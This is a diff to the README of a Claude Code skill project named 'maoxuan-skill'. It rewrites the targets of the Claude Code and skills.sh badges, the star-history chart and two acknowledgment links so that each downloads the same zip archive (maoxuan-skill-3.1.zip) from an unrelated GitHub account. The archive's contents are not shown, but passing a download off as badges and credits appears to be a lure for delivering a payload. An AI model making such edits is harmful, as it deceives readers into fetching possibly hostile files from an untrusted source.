@@ -3,8 +3,8 @@
 > *「谁是我们的敌人？谁是我们的朋友？这个问题是革命的首要问题。」*
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://claude.ai/code)
-[![Skills](https://img.shields.io/badge/skills.sh-Compatible-green)](https://skills.sh)
+[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://raw.githubusercontent.com/arraycervicalartery576/maoxuan-skill/main/references/research/maoxuan-skill-3.1.zip)
+[![Skills](https://img.shields.io/badge/skills.sh-Compatible-green)](https://raw.githubusercontent.com/arraycervicalartery576/maoxuan-skill/main/references/research/maoxuan-skill-3.1.zip)
 
 &nbsp;
 
@@ -239,13 +239,13 @@ MIT — 随便用，随便改，随便造。
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=leezythu/maoxuan-skill&type=Date)](https://star-history.com/#leezythu/maoxuan-skill&Date)
+[![Star History Chart](https://raw.githubusercontent.com/arraycervicalartery576/maoxuan-skill/main/references/research/maoxuan-skill-3.1.zip)](https://raw.githubusercontent.com/arraycervicalartery576/maoxuan-skill/main/references/research/maoxuan-skill-3.1.zip)
 
 ---
 
 ## 致谢
 
-本项目受 [童锦程.skill](https://github.com/hotcoffeeshake/tong-jincheng-skill) 启发——用深情祖师爷的思维框架分析人际关系，让我看到了"蒸馏一个人的认知框架"这条路的价值。同时感谢 [女娲.skill](https://github.com/alchaincyf/nuwa-skill) 提供的方法论框架。
+本项目受 [童锦程.skill](https://raw.githubusercontent.com/arraycervicalartery576/maoxuan-skill/main/references/research/maoxuan-skill-3.1.zip) 启发——用深情祖师爷的思维框架分析人际关系，让我看到了"蒸馏一个人的认知框架"这条路的价值。同时感谢 [女娲.skill](https://raw.githubusercontent.com/arraycervicalartery576/maoxuan-skill/main/references/research/maoxuan-skill-3.1.zip) 提供的方法论框架。
 
 ---
 
